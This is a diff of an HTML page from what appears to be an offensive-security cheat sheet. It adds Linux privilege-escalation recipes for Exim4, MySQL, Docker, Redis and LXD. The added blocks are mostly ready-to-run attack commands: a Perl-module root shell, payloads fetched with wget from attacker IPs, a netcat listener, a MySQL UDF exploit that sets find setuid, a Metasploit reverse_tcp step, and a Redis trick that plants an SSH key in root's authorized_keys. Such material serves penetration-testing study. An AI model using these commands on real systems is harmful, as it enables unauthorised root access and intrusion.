@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-10-06T12:58:12 CEST">
+<meta name="revised" content="2019-10-07T16:01:10 CEST">
 <title>Services :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1094,6 +1094,20 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/linux-systems/privilege-escalation/abusing_sudo_rights/" class="dd-item">
+        <div>
+          <a href="/linux-systems/privilege-escalation/abusing_sudo_rights/">
+            Abusing Sudo Rights
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
+      <li data-nav-id="/linux-systems/privilege-escalation/suid/" class="dd-item">
+        <div>
+          <a href="/linux-systems/privilege-escalation/suid/">
+            SUID files
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
       <li data-nav-id="/linux-systems/privilege-escalation/services/" class="dd-item active">
         <div>
           <a href="/linux-systems/privilege-escalation/services/">
@@ -1101,10 +1115,10 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
-      <li data-nav-id="/linux-systems/privilege-escalation/abusing_sudo_programs/" class="dd-item">
+      <li data-nav-id="/linux-systems/privilege-escalation/crontab/" class="dd-item">
         <div>
-          <a href="/linux-systems/privilege-escalation/abusing_sudo_programs/">
-            Abusing sudo programs
+          <a href="/linux-systems/privilege-escalation/crontab/">
+            Crontab
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
@@ -1314,8 +1328,10 @@
   - 
    Privilege Escalation</option> 
       <option value="/linux-systems/privilege-escalation/system_tricks/" >-- System Tricks</option>
+      <option value="/linux-systems/privilege-escalation/abusing_sudo_rights/" >-- Abusing Sudo Rights</option>
+      <option value="/linux-systems/privilege-escalation/suid/" >-- SUID files</option>
       <option value="/linux-systems/privilege-escalation/services/"  selected>-- Services</option>
-      <option value="/linux-systems/privilege-escalation/abusing_sudo_programs/" >-- Abusing sudo programs</option>
+      <option value="/linux-systems/privilege-escalation/crontab/" >-- Crontab</option>
   
     <option value="/linux-systems/programing-languages/" >
   - 
@@ -1359,6 +1375,18 @@
     
     
 
+<h3 id="table-of-content">Table of Content</h3>
+
+<ul>
+<li>Exim4</li>
+<li>MySQL</li>
+<li>Docker</li>
+<li>Redis</li>
+<li>LXD</li>
+</ul>
+
+<p><br/></p>
+
 <h3 id="exim4">Exim4</h3>
 <div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># https://www.exploit-db.com/exploits/39535</span>
 
@@ -1370,7 +1398,11 @@ cat &gt; /tmp/root.pm <span style="color:#d88200">&lt;&lt; EOF
 </span><span style="color:#d88200">use warnings;
 </span><span style="color:#d88200">system(&#34;/bin/sh&#34;);
 </span><span style="color:#d88200">EOF</span>
-<span style="color:#111">PERL5LIB</span><span style="color:#f92672">=</span>/tmp <span style="color:#111">PERL5OPT</span><span style="color:#f92672">=</span>-Mroot /usr/exim/bin/exim -ps</code></pre></div>
+<span style="color:#111">PERL5LIB</span><span style="color:#f92672">=</span>/tmp <span style="color:#111">PERL5OPT</span><span style="color:#f92672">=</span>-Mroot /usr/exim/bin/exim -ps</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://192.168.0.8:8000/raptor_exim_wiz.sh
+chmod <span style="color:#ae81ff">777</span> raptor_exim_wiz.sh
+./raptor_exim_wiz.sh -m netcat
+
+nc -lvvp <span style="color:#ae81ff">4444</span></code></pre></div>
 <p><br/></p>
 
 <h3 id="mysql">MySQL</h3>
@@ -1382,14 +1414,92 @@ Select sys_eval<span style="color:#f92672">(</span><span style="color:#d88200">&
 
 
 <span style="color:#75715e"># MySQL run as root and version is &lt;5 go for User Defined Functions (UDF)</span>
-<span style="color:#75715e"># TODO</span></code></pre></div>
+https://www.exploit-db.com/exploits/1518/
+
+<span style="color:#75715e"># searching and compiling exploit</span>
+searchsploit –m <span style="color:#ae81ff">1518</span>.c
+gcc -g -shared -Wl,-soname,1518.so -o <span style="color:#ae81ff">1518</span>.so <span style="color:#ae81ff">1518</span>.c -lc
+wget http://192.168.1.109/1518.so
+chmod <span style="color:#ae81ff">777</span> <span style="color:#ae81ff">1518</span>.so
+
+mysql –u root –p
+use mysql<span style="color:#111">;</span>
+
+<span style="color:#75715e"># Exploitation</span>
+create table foo<span style="color:#f92672">(</span>line blob<span style="color:#f92672">)</span><span style="color:#111">;</span>
+insert into foo values<span style="color:#f92672">(</span>load_file<span style="color:#f92672">(</span><span style="color:#d88200">&#39;/tmp/1518.so&#39;</span><span style="color:#f92672">))</span><span style="color:#111">;</span>
+<span style="color:#00a8c8">select</span> * from foo into dumpfile <span style="color:#d88200">&#39;/usr/lib/mysql/plugin/1518.so&#39;</span><span style="color:#111">;</span>
+create <span style="color:#00a8c8">function</span> do_system returns integer soname <span style="color:#d88200">&#39;1518.so&#39;</span><span style="color:#111">;</span>
+<span style="color:#00a8c8">select</span> do_system<span style="color:#f92672">(</span><span style="color:#d88200">&#39;chmod u+s /usr/bin/find&#39;</span><span style="color:#f92672">)</span><span style="color:#111">;</span>
+
+<span style="color:#75715e"># Privesc</span>
+touch raj
+find raj –exec <span style="color:#d88200">&#34;whoami&#34;</span> <span style="color:#8045ff">\;</span>
+find raj –exec <span style="color:#d88200">&#34;/bin/sh&#34;</span> <span style="color:#8045ff">\;</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="docker">Docker</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># If the user can run docker</span>
+docker run –v /root:/hack -t debian:jessie /bin/sh -c <span style="color:#d88200">&#39;ls -al /hack&#39;</span>
+
+<span style="color:#75715e"># Docker privesc on metasploit</span>
+msf &gt; use exploit/linux/local/docker_daemon_privilege_escalation
+msf exploit<span style="color:#f92672">(</span>linux/local/docker_daemon_privilege_escalation<span style="color:#f92672">)</span> &gt;  <span style="color:#111">set</span> lhost <span style="color:#ae81ff">192</span>.168.1.116
+msf exploit<span style="color:#f92672">(</span>linux/local/docker_daemon_privilege_escalation<span style="color:#f92672">)</span> &gt;  <span style="color:#111">set</span> payload linux/x86/meterpreter/reverse_tcp
+msf exploit<span style="color:#f92672">(</span>linux/local/docker_daemon_privilege_escalation<span style="color:#f92672">)</span> &gt;  <span style="color:#111">set</span> session <span style="color:#ae81ff">1</span>
+msf exploit<span style="color:#f92672">(</span>linux/local/docker_daemon_privilege_escalation<span style="color:#f92672">)</span> &gt;  run</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Check available images</span>
+docker images
+
+<span style="color:#75715e"># You can mount the / of the host inside a container</span>
+docker run -v /:/root -i -t ubuntu /bin/bash</code></pre></div>
+<p><br/></p>
+
+<h3 id="redis">Redis</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># You can abuse Redis by writing malicious RSA keypair to the disk</span>
+ssh-keygen
+
+<span style="color:#75715e"># Prepare the public key by adding newlines with the help of the following command</span>
+<span style="color:#f92672">(</span><span style="color:#111">echo</span> -e <span style="color:#d88200">&#34;\n\n&#34;</span><span style="color:#111">;</span> cat id_rsa.pub<span style="color:#111">;</span> <span style="color:#111">echo</span> -e <span style="color:#d88200">&#34;\n\n&#34;</span><span style="color:#f92672">)</span> &gt; public.txt
+
+<span style="color:#75715e"># Load the malicious public key into redis</span>
+cat public.txt <span style="color:#111">|</span> redis-cli -h <span style="color:#ae81ff">127</span>.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x <span style="color:#111">set</span> pub
+
+<span style="color:#75715e"># Set path to dump the content with the help of the following command</span>
+redis-cli -h <span style="color:#ae81ff">127</span>.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config <span style="color:#111">set</span> dir <span style="color:#d88200">&#34;/root/.ssh/&#34;</span>
+
+<span style="color:#75715e"># Configure the dbfilename as authorized_keys</span>
+redis-cli -h <span style="color:#ae81ff">127</span>.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 config <span style="color:#111">set</span> dbfilename authorized_keys
+
+<span style="color:#75715e"># Save the configuration and exit.</span>
+redis-cli -h <span style="color:#ae81ff">127</span>.0.0.1 -a 8a7b86a2cd89d96dfcc125ebcc0535e6 save
+
+<span style="color:#75715e"># Then authenticate</span>
+<span style="color:#111">cd</span> .ssh
+ssh root@127.0.0.1</code></pre></div>
+<p><br/></p>
+
+<h3 id="lxd">LXD</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Searching LXD exploit and get exploit (attacker machine)</span>  
+searchsploit lxd
+searchsploit -m <span style="color:#ae81ff">46978</span>
+wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
+bash build-alpine
+
+<span style="color:#75715e"># Victim machine</span>
+wget http://192.168.0.26:8000/alpine-v3.10-x86_64-20190905_0123.tar.gz
+nano raj.sh <span style="color:#75715e"># (cp the exploit content)</span>
+chmod <span style="color:#ae81ff">777</span> raj.sh
+./raj.sh -f alpine-v3.10-x86_64-20190905_0123.tar.gz
+
+<span style="color:#75715e"># Crawl the host filesystem</span>
+<span style="color:#111">cd</span> /mnt/root/</code></pre></div>
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/linux-systems/privilege-escalation/system_tricks/" title="System Tricks"> <i class="fa fa-chevron-left"></i><label>System Tricks</label></a>
-    <a class="nav nav-next" href="/linux-systems/privilege-escalation/abusing_sudo_programs/" title="Abusing sudo programs" style="margin-right: 0px;"><label>Abusing sudo programs</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/linux-systems/privilege-escalation/suid/" title="SUID files"> <i class="fa fa-chevron-left"></i><label>SUID files</label></a>
+    <a class="nav nav-next" href="/linux-systems/privilege-escalation/crontab/" title="Crontab" style="margin-right: 0px;"><label>Crontab</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
